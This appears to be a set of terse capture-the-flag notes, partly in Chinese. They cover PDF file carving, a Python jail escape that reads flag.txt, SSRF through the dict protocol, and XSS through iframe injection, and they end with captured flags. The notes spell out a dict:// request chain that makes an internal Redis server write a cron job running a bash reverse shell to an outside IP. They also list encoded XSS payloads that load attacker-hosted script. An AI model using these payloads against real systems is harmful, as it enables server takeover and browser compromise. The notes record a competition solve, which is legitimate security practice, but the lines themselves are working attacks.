# pdf

foremost -t doc,jpg,pdf,xls -i 2333.pdf

# pwn jail

```
print(getattr(os, "listdir")())
['pwn50.py', '.bash_profile', '.viminfo', '.bashrc', '.bash_history', 'flag.txt', 'run.sh', '.bash_logout']

```

print("%s"%getattr(file,"readlines")())
file = open(getattr(os, "listdir")()[5])

# web300
http://www.611eternity.com/DNSRebinding%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0/
https://ricterz.me/posts/Use%20DNS%20Rebinding%20to%20Bypass%20IP%20Restriction
以上错误思路，增长见识()
http://4o4notfound.org/index.php/archives/33/
https://blog.chaitin.cn/gopher-attack-surfaces/

Protocols	tftp, ftp, telnet, dict, http, file
dict利用：dict协议有一个功能：dict://serverip:port/name:data 向服务器的端口请求 name data，并在末尾自动补上rn(CRLF)。也就是如果我们发出

dict://0xAC120002:6379/flushall
dict://0xAC120002:6379/set:0:"\x0a\x0a*/1\x20*\x20*\x20*\x20*\x20/bin/bash\x20-i\x20>\x26\x20/dev/tcp/47.90.120.165/8990\x200>\x261\x0a\x0a\x0a"
dict://0xAC120002:6379/config:set:dir:/var/spool/cron
dict://0xAC120002:6379/config:set:dbfilename:root
dict://0xAC120002:6379/save

SYC{7aef12345e2aa21ae8f97ca8b5d9e581}

# caidao
http://118.89.225.190/shellbox.php?shell=<iframe%20src="data:text/html;base64,PHNjcmlwdCBzcmM9aHR0cDovLzQ3LjkwLjEyMC4xNjU6NTAwMC94P3U9MSZhPTE+PC9zY3JpcHQ+">
https://mothereff.in/html-entities

![](https://django.c1tas.com/pic/orign/24)

http://118.89.225.190/shellbox.php?shell=%3Ciframe%20src=%22http://47.90.120.165:8999/123%22%3E

http://118.89.225.190/shellbox.php?shell=%3CIFRAME%20SRC=%22&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;&#x64;&#x6F;&#x63;&#x75;&#x6D;&#x65;&#x6E;&#x74;&#x2E;&#x77;&#x72;&#x69;&#x74;&#x65;&#x28;&#x27;&#x3C;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x20;&#x73;&#x72;&#x63;&#x3D;&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x34;&#x37;&#x2E;&#x39;&#x30;&#x2E;&#x31;&#x32;&#x30;&#x2E;&#x31;&#x36;&#x35;&#x3A;&#x39;&#x39;&#x39;&#x39;&#x2F;&#x32;&#x2E;&#x6A;&#x73;&#x3E;&#x3C;&#x2F;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;&#x27;&#x29;&#xA;"></IFRAME>

```
GET /?code=PCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBYSFRNTCAxLjAgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL3hodG1sMS9EVEQveGh0bWwxLXRyYW5zaXRpb25hbC5kdGQiPg0KPGh0bWwgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGh0bWwiIHhtbDpsYW5nPSJlbiI%2BDQo8aGVhZD4NCiAgICA8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDtjaGFyc2V0PVVURi04Ij4NCiAgICA8c2NyaXB0IHNyYz0iLi9qcXVlcnkubWluLmpzIj48L3NjcmlwdD4NCiAgICA8IS0tIOi%2FmemHjOaYr%2BS4jeS8muaciea8j%2Ba0nueahCAtLT4NCjwvaGVhZD4NCjxib2R5Pg0KPCEtLSBTWUN7MV93ME50X0QwXzFUXzRnQWlufSAtLT48SUZSQU1FIFNSQz0iaHR0cDovLzQ3LjkwLjEyMC4xNjU6ODk5MCI%2BPC9JRlJBTUU%2BPC9ib2R5Pg0KPC9odG1sPg0K HTTP/1.1
```

```
'<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">\r\n<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">\r\n<head>\r\n    <meta http-equiv="Content-Type" content="text/html;charset=UTF-8">\r\n    <script src="./jquery.min.js"></script>\r\n    <!-- 这里是不会有漏洞的 -->\r\n</head>\r\n<body>\r\n<!-- SYC{1_w0Nt_D0_1T_4gAin} --><IFRAME SRC="http://47.90.120.165:8990"></IFRAME></body>\r\n</html>\r\n'
```

#

Q1T0NGW3H
AB@15!74587~CAIBUDAN
